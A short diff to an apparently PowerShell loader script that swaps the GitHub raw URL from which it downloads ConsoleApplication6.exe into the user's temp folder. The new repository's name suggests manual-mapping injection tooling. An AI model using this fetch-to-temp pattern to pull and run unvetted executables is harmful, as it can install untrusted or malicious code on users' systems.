@@ -1,5 +1,5 @@
 # 1. Correct GitHub raw link
-$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/consolehistory/main/ConsoleApplication6.exe"
+$exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/ConsoleApplication6.exe"
 $tempPath = "$env:TEMP\ConsoleApplication6.exe"
 
 # 2. Download EXE from GitHub
